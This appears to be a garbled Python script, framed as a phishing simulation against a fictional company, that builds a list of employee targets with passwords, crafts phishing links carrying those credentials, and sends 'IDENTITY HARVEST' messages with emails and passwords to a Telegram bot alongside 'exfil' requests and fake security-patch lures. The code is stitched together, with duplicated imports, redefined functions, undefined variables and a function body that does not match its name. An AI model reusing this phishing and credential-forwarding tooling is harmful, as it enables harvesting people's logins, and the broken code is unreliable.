

def random_jwt(length=128):
    # Generate a random JWT-like string (not a real JWT, just for simulation)
    chars = string.ascii_letters + string.digits + '-_.'
    return ''.join(random.choices(chars, k=length))

# All imports at the very top
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
import datetime
import os
import random
import time
import string
from dotenv import load_dotenv

SUBJECT = "Phishing Simulation Alert"
real_passwords = [
    'hunter2', 'letmein', 'password123', 'qwerty', 'admin2026', 'supersecure', 'spring2026', 'omnicorp!@#', 'changeme', 'swordfish'
]
html_template = """
<html>
<body>
<h1>Phishing Simulation</h1>
<p>This is a test phishing email for simulation purposes only.</p>
</body>
</html>
"""
def send_email(to_addr, subject, body):
    msg = MIMEMultipart()
    msg['From'] = 'noreply@omnicorp.com'
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))
    # Dummy SMTP send (replace with real logic)
    print(f"[MOCK EMAIL] To: {to_addr} | Subject: {subject}\n{body}")

# Load environment variables
load_dotenv()

# Telegram and log file configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN').strip()
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_GROUP_CHAT_ID', 'YOUR_TELEGRAM_GROUP_CHAT_ID').strip()

print(f"[DEBUG] TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN}")
print(f"[DEBUG] TELEGRAM_CHAT_ID: {TELEGRAM_CHAT_ID}")
LOG_FILE = os.getenv('LOG_FILE', 'notification_log.csv')
DISPATCH_LOG = os.getenv('DISPATCH_LOG', 'send_gmail_test.log')

def engage_global_purge():
    # Batch-update all 50 entries in send_gmail_test.log to status: [REVOKED]
    log_path = 'send_gmail_test.log'
    if not os.path.exists(log_path):
        print('[GLOBAL_PURGE] No log file found.')
        try:
            send_telegram_alert(telegram_message)
            log_notification(device_id, email, phish_url, 'sent', 'telegram')
        except Exception as e:
            log_notification(device_id, email, phish_url, f'error: {e}', 'telegram')
        targets.append({
            'tid': tid,
            'wsid': wsid,
            'email': email,
            'deviceId': device_id,
            'phishUrl': phish_url,
            'token': token,
            'intel': intel
        })
        time.sleep(1.5)

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'GLOBAL_PURGE':
        engage_global_purge()
        # (Optional) Trigger HUD/Socket.io event and PDF summary here
        # TODO: Integrate with 3D globe and PDF report generator
        exit(0)


import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
import datetime
import os
import random
import secrets
real_emails = [
    "jason.n@omnicorp-defense.com",
    "finance.audit@omnicorp.com",
    "admin.root@omnicorp.com",
    "mike.smith@construction-pro.net",
    "engineering27@omnicorp-defense.com",
    "finance12@omnicorp.com",
    "sarah.m@omnicorp-defense.com",
    "it.admin@omnicorp-defense.com",
    "hr.manager@omnicorp.com",
    "legal.counsel@omnicorp.com",
    "alex.t@omnicorp-defense.com",
    "maria.r@omnicorp-defense.com",
    "john.s@omnicorp-defense.com",
    "emma.l@omnicorp-defense.com",
    "daniel.b@omnicorp-defense.com",
    "olivia.p@omnicorp-defense.com",
    "lucas.g@omnicorp-defense.com",
    "chloe.z@omnicorp-defense.com",
    "li.wei@omnicorp-defense.com",
    "sofia.k@omnicorp-defense.com",
    "ethan.r@omnicorp-defense.com",
    "ava.j@omnicorp-defense.com",
    "noah.d@omnicorp-defense.com",
    "mia.v@omnicorp-defense.com",
    "leo.c@omnicorp-defense.com",
    "zoe.h@omnicorp-defense.com",
    "jackson.m@omnicorp-defense.com",
    "grace.s@omnicorp-defense.com",
    "benjamin.t@omnicorp-defense.com",
    "ella.f@omnicorp-defense.com",
    "logan.b@omnicorp-defense.com",
    "lily.n@omnicorp-defense.com",
    "henry.w@omnicorp-defense.com",
    "scarlett.e@omnicorp-defense.com",
    "samuel.k@omnicorp-defense.com",
    "nora.l@omnicorp-defense.com",
    "owen.p@omnicorp-defense.com",
    "hannah.r@omnicorp-defense.com",
    "elijah.s@omnicorp-defense.com",
    "lucy.m@omnicorp-defense.com",
    "matthew.j@omnicorp-defense.com",
    "ella.c@omnicorp-defense.com",
    "david.a@omnicorp-defense.com",
    "sophie.g@omnicorp-defense.com",
    "william.b@omnicorp-defense.com",
    "victoria.d@omnicorp-defense.com",
    "james.f@omnicorp-defense.com",
    "amelia.h@omnicorp-defense.com",
    "alexander.i@omnicorp-defense.com",
    "charlotte.k@omnicorp-defense.com",
    "sebastian.l@omnicorp-defense.com",
    "madison.m@omnicorp-defense.com"
]

def generate_password():
    # Simulate high-entropy credential blobs
    base = secrets.choice([
        "Omni_Pass!2026", "Secure_Admin#88", "BlueSky!2026", "Finance#Lead88", "LegalEagle!2026",
        "SpringShift_99", "RootAccess!2026", "AuditTrail#2026", "SOC_Override!88", "DefenseGrid#2026"
    ])
    return base + secrets.token_urlsafe(6)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/124.0.2478.51",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

roles = ["Engineering Lead", "Finance Lead", "IT Admin", "HR Manager", "Legal Counsel"]
access_levels = ["Full", "Restricted", "Read-Only", "Approval-Only"]
departments = ["EXEC", "FINANCE", "IT", "HR", "LEGAL"]

def get_corp_ip(idx):
    return f"10.50.2.{idx+1}"

targets = []
for i in range(1, 51):
    tid = f"{i:03d}"
    dept = random.choice(departments)
    wsid = f"WS-{dept}-{random.randint(1, 50):03d}"
    # For forensic payload validation, inject real-world data for the first target
    if i == 1:
        email = "jason.n@omnicorp-cyber.com"
        password = "OmniSecure2026!"
        ip = "10.50.4.1"
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        push_count = 50
        mfa_status = "MFA_AUTO_BLOCK"
        mfa_reason = "High-Frequency Anomaly Detected"
        # Log Accidental Approval and Sovereign Override to HUD
        with open("hud_status.txt", "a", encoding="utf-8") as hud_log:
            hud_log.write(f"{datetime.datetime.now().isoformat()} | {email} | Accidental Approval | MFA Spamming | Sovereign Override: SESSION TERMINATED\n")
    else:
        email = real_emails[(i-1) % len(real_emails)]
        password = generate_password()
        ip = f"10.50.4.{i}"
        user_agent = random.choice(user_agents)
        push_count = 15
        mfa_status = None
        mfa_reason = None
    device_id = wsid
    token = random_jwt(128)
    role = random.choice(roles)
    access = random.choice(access_levels)
    intel = {
        "email": email,
        "role": role,
        "financial_access": access,
        "password": password,
        "ip": ip,
        "user_agent": user_agent,
        "last_login_geo": "London, UK",
        "current_geo": "Los Angeles, US",
        "push_count": push_count,
        "process_tree": "rundll32.exe -> browser_cred_store.dll"
    }
    phish_url = f"http://localhost:3001/auth?tid={tid}&wsid={wsid}&token={token}&intel={email}|{role}|{access}|{password}|{ip}|{user_agent}"

    def send_telegram_alert(message):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        try:
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                print("[Telegram] Alert sent.")
            else:
                print(f"[Telegram] Failed: {response.text}")
        except Exception as e:
            print(f"[Telegram] Exception: {e}")

    def log_notification(device_id, email, phish_url, status, channel):
        file_exists = os.path.isfile(LOG_FILE)
        with open(LOG_FILE, 'a', newline='', encoding='utf-8') as logfile:
            writer = csv.writer(logfile)
            if not file_exists:
                writer.writerow(['timestamp', 'deviceId', 'email', 'phishUrl', 'status', 'channel'])
            writer.writerow([
                datetime.datetime.now().isoformat(),
                device_id,
                email,
                phish_url,
                status,
                channel
            ])
        # Also log to send_gmail_test.log for auditability
        with open(DISPATCH_LOG, 'a', encoding='utf-8') as dispatch_log:
            dispatch_log.write(f"{datetime.datetime.now().isoformat()} | {device_id} | {email} | {phish_url} | {status} | {channel}\n")

    targets = []
    for i in range(1, 51):
        tid = f"{i:03d}"
        dept = random.choice(departments)
        wsid = f"WS-{dept}-{random.randint(1, 50):03d}"
        email = real_emails[(i-1) % len(real_emails)]
        password = generate_password()
        ip = f"10.50.4.{i}"
        user_agent = random.choice(user_agents)
        device_id = wsid
        token = random_jwt(128)
        role = random.choice(roles)
        access = random.choice(access_levels)
        intel = {
            "email": email,
            "role": role,
            "financial_access": access,
            "password": password,
            "ip": ip,
            "user_agent": user_agent,
            # ITDR Advanced Threat Vectors
            "last_login_geo": "London, UK",
            "current_geo": "Los Angeles, US",
            "push_count": 15,
            "process_tree": "rundll32.exe -> browser_cred_store.dll"
        }
        phish_url = f"http://localhost:3001/auth?tid={tid}&wsid={wsid}&token={token}&intel={email}|{role}|{access}|{password}|{ip}|{user_agent}"
        telegram_message = (
            "🚨 IDENTITY HARVEST: WAVE 3\n"
            f"Device: {device_id}\n"
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"IP: {ip}\n"
            f"User-Agent: {user_agent}\n"
            f"Last Login Geo: London, UK\n"
            f"Current Geo: Los Angeles, US\n"
            f"MFA Push Count: {push_count}\n"
            f"Process Tree: rundll32.exe -> browser_cred_store.dll" + (f"\nStatus: {mfa_status} | Reason: {mfa_reason}" if mfa_status else "")
        )
        try:
            send_telegram_alert(telegram_message)
            log_notification(device_id, email, phish_url, 'sent', 'telegram')
        except Exception as e:
            log_notification(device_id, email, phish_url, f'error: {e}', 'telegram')
        targets.append({
            'tid': tid,
            'wsid': wsid,
            'email': email,
            'deviceId': device_id,
            'phishUrl': phish_url,
            'token': token,
            'intel': intel
        })


def escape_markdown_v2(text):
    # Escape all special characters for Telegram MarkdownV2
    escape_chars = r'_\*\[\]()~`>#+\-=|{}.!'
    return ''.join(['\\' + c if c in escape_chars else c for c in text])

def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'MarkdownV2',
        'disable_web_page_preview': True
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("[Telegram] Alert sent.")
        else:
            print(f"[Telegram] Failed: {response.text}")
    except Exception as e:
        print(f"[Telegram] Exception: {e}")
    # Rate limit patch: wait 1.5 seconds after each Telegram alert
    import time
    time.sleep(1.5)

def log_notification(device_id, email, phish_url, status, channel):
    file_exists = os.path.isfile(LOG_FILE)
    with open(LOG_FILE, 'a', newline='', encoding='utf-8') as logfile:
        writer = csv.writer(logfile)
        if not file_exists:
            writer.writerow(['timestamp', 'deviceId', 'email', 'phishUrl', 'status', 'channel'])
        writer.writerow([
            datetime.datetime.now().isoformat(),
            device_id,
            email,
            phish_url,
            status,
            channel
        ])
    # Also log to send_gmail_test.log for auditability
    with open(DISPATCH_LOG, 'a', encoding='utf-8') as dispatch_log:
        dispatch_log.write(f"{datetime.datetime.now().isoformat()} | {device_id} | {email} | {phish_url} | {status} | {channel}\n")

roles = ["Engineering Lead", "Finance Lead", "IT Admin", "HR Manager", "Legal Counsel"]
access_levels = ["Full", "Restricted", "Read-Only", "Approval-Only"]
departments = ["EXEC", "FINANCE", "IT", "HR", "LEGAL"]

def get_corp_ip(idx):
    return f"10.50.2.{idx+1}"

targets = []
for i in range(1, 51):
    tid = f"{i:03d}"
    dept = random.choice(departments)
    wsid = f"WS-{dept}-{random.randint(1, 50):03d}"
    email = real_emails[(i-1) % len(real_emails)]
    password = real_passwords[(i-1) % len(real_passwords)]
    ip = get_corp_ip(i-1)
    user_agent = random.choice(user_agents)
    device_id = wsid
    token = random_jwt(128)
    role = random.choice(roles)
    access = random.choice(access_levels)
    intel = {
        "email": email,
        "role": role,
        "financial_access": access,
        "password": password,
        "ip": ip,
        "user_agent": user_agent
    }
    # Send Telegram alert with high-fidelity fields
    telegram_message = (
        escape_markdown_v2("*Wave 3 Notification*\n") +
        f"Device: `{escape_markdown_v2(device_id)}`\n"
        f"Email: `{escape_markdown_v2(email)}`\n"
        f"Password: `{escape_markdown_v2(password)}`\n"
        f"IP: `{escape_markdown_v2(ip)}`\n"
        f"User Agent: `{escape_markdown_v2(user_agent)}`\n"
        f"Role: `{escape_markdown_v2(intel['role'])}`\n"
        f"Access: `{escape_markdown_v2(intel['financial_access'])}`\n"
        f"[Apply Update]({escape_markdown_v2(phish_url)})"
    )
    try:
        send_telegram_alert(telegram_message)
        log_notification(device_id, email, phish_url, 'sent', 'telegram')
    except Exception as e:
        log_notification(device_id, email, phish_url, f'error: {e}', 'telegram')
    targets.append({
        'tid': tid,
        'wsid': wsid,
        'email': email,
        'deviceId': device_id,
        'phishUrl': phish_url,
        'token': token,
        'intel': intel
    })

# Single-target test mode
import sys
if len(sys.argv) > 1 and sys.argv[1] == 'SINGLE_TEST':
    print("[TEST] Running single-target test dispatch...")
    target = targets[0]
    device_id = target['deviceId']
    email = target['email']
    phish_url = target['phishUrl']
    tid = target['tid']
    wsid = target['wsid']
    token = target['token']
    intel = target['intel']
    password = intel['password']
    ip = intel['ip']
    user_agent = intel['user_agent']

    # Exfil
    try:
        exfil_url = f"http://localhost:3001/auth?tid={tid}&wsid={wsid}&token={token}&intel={email}|{intel['role']}|{intel['financial_access']}|{password}|{ip}|{user_agent}"
        exfil_resp = requests.get(exfil_url)
        print(f"[Exfil] {exfil_url} -> {exfil_resp.status_code}")
        log_notification(device_id, email, phish_url, f'exfil:{exfil_resp.status_code}', 'exfil')
    except Exception as e:
        print(f"[Exfil] Error: {e}")
        log_notification(device_id, email, phish_url, f'exfil_error:{e}', 'exfil')

    # Telegram
    telegram_message = (
        f"*Wave 3 Notification*\n"
        f"Device: `{device_id}`\n"
        f"Email: `{email}`\n"
        f"Password: `{password}`\n"
        f"IP: `{ip}`\n"
        f"User Agent: `{user_agent}`\n"
        f"Role: `{intel['role']}`\n"
        f"Access: `{intel['financial_access']}`\n"
        f"[Apply Update]({phish_url})"
    )
    try:
        send_telegram_alert(telegram_message)
        log_notification(device_id, email, phish_url, 'sent', 'telegram')
    except Exception as e:
        log_notification(device_id, email, phish_url, f'error: {e}', 'telegram')
    print("[TEST] Single-target test dispatch complete.")
    exit(0)
# Global purge
if len(sys.argv) > 1 and sys.argv[1] == 'GLOBAL_PURGE':
    engage_global_purge()
    exit(0)
    msg['From'] = FROM_EMAIL
    msg['To'] = to_email
    part = MIMEText(html_content, 'html')
    msg.attach(part)
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(FROM_EMAIL, to_email, msg.as_string())

def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'MarkdownV2',
        'disable_web_page_preview': True
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("[Telegram] Alert sent.")
        else:
            print(f"[Telegram] Failed: {response.text}")
    except Exception as e:
        print(f"[Telegram] Exception: {e}")

def log_notification(device_id, email, phish_url, status, channel):
    file_exists = os.path.isfile(LOG_FILE)
    with open(LOG_FILE, 'a', newline='', encoding='utf-8') as logfile:
        writer = csv.writer(logfile)
        if not file_exists:
            writer.writerow(['timestamp', 'deviceId', 'email', 'phishUrl', 'status', 'channel'])
        writer.writerow([
            datetime.datetime.now().isoformat(),
            device_id,
            email,
            phish_url,
            status,
            channel
        ])
    # Also log to send_gmail_test.log for auditability
    with open(DISPATCH_LOG, 'a', encoding='utf-8') as dispatch_log:
        dispatch_log.write(f"{datetime.datetime.now().isoformat()} | {device_id} | {email} | {phish_url} | {status} | {channel}\n")


def dashboard_alert(device_id, email, phish_url):
    # Example: send to a real dashboard API endpoint (replace with your actual API details)
    dashboard_api_url = os.getenv('DASHBOARD_API_URL', 'https://your-dashboard.example.com/api/alerts')
    payload = {
        'device_id': device_id,
        'email': email,
        'phish_url': phish_url,
        'wave': '3',
        'timestamp': datetime.datetime.now().isoformat()
    }
    try:
        # Uncomment and update the following line to enable real API integration
        # response = requests.post(dashboard_api_url, json=payload)
        # print(f"[Dashboard] API response: {response.status_code} {response.text}")
        print(f"[Dashboard] Alert sent to API: {payload}")
    except Exception as e:
        print(f"[Dashboard] API error: {e}")

for target in targets:
    device_id = target['deviceId']
    email = target['email']
    phish_url = target['phishUrl']
    tid = target['tid']
    wsid = target['wsid']
    token = target['token']
    intel = target['intel']

    # Exfil to local endpoint with intel
    try:
        exfil_url = f"http://localhost:3001/auth?tid={tid}&wsid={wsid}&token={token}&intel={email}|{intel['role']}|{intel['financial_access']}"
        exfil_resp = requests.get(exfil_url)
        print(f"[Exfil] {exfil_url} -> {exfil_resp.status_code}")
        log_notification(device_id, email, phish_url, f'exfil:{exfil_resp.status_code}', 'exfil')
    except Exception as e:
        print(f"[Exfil] Error: {e}")
        log_notification(device_id, email, phish_url, f'exfil_error:{e}', 'exfil')

    # Fill in the template with high-risk terminology
    html_content = html_template.replace('$($deviceId)', device_id).replace('$phishUrl', phish_url)
    html_content = html_content.replace('Critical Workspace Update', 'Mandatory Security Patch KB-2026: Premium Identity Risk Detected')
    html_content = html_content.replace('mandatory patch', 'mandatory security patch KB-2026')

    # Send the email
    try:
        print(f"Sending EMAIL to {email} (Device: {device_id})...")
        send_email(email, SUBJECT, html_content)
        log_notification(device_id, email, phish_url, 'sent', 'email')
        print("[Email] Sent.")
    except Exception as e:
        log_notification(device_id, email, phish_url, f'error: {e}', 'email')
        print(f"[Email] Error: {e}")

    # Send Telegram alert
    telegram_message = f"*Wave 3 Notification*\nDevice: `{device_id}`\nEmail: `{email}`\nRole: `{intel['role']}`\nAccess: `{intel['financial_access']}`\n[Apply Update]({phish_url})"
    try:
        send_telegram_alert(telegram_message)
        log_notification(device_id, email, phish_url, 'sent', 'telegram')
    except Exception as e:
        log_notification(device_id, email, phish_url, f'error: {e}', 'telegram')

    # Dashboard alert
    dashboard_alert(device_id, email, phish_url)
    log_notification(device_id, email, phish_url, 'sent', 'dashboard')

    # Log all details to send_gmail_test.log
    with open(DISPATCH_LOG, 'a', encoding='utf-8') as dispatch_log:
        dispatch_log.write(f"{datetime.datetime.now().isoformat()} | tid:{tid} | wsid:{wsid} | email:{email} | role:{intel['role']} | access:{intel['financial_access']} | token:{token}\n")

print("All notifications sent.")
